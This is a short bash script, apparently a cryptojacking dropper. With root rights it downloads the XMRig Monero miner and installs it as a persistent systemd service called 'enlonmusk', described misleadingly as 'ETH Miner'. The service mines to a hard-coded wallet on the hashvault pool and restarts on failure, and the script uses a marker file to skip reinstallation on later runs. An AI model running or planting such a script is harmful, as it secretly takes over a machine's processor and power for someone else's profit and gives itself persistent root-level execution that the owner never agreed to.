/bin/bash
SCRIPT_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )"
if [ ! -f "${SCRIPT_DIR}/enlonmusk.txt" ];
then
  echo "run enlonmusk" > enlonmusk.txt
  cd /usr/local/bin
  sudo wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz
  sudo tar -xvf xmrig-6.24.0-linux-static-x64.tar.gz
  sudo bash -c 'echo -e "[Unit]\nDescription=ETH Miner\nAfter=network.target\n\n[Service]\nType=simple\nRestart=on-failure\nRestartSec=15s\nExecStart=/usr/local/bin/xmrig-6.24.0/xmrig -proxy --url pool.hashvault.pro:443 --user 43AXQH5eTxzX4rV2U7oU6XhGBsRweQ9mwWuKvmvkHfgNg6g7yCi9AzFGenwfznLhtMhVnJjG4hdNwatnJDbCXScc1gWg7G5 --pass x --donate-level 1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/enlonmusk.service'
  sudo systemctl daemon-reload
  sudo systemctl enable enlonmusk.service
  sudo systemctl start enlonmusk.service
else
  sudo systemctl start enlonmusk.service
fi


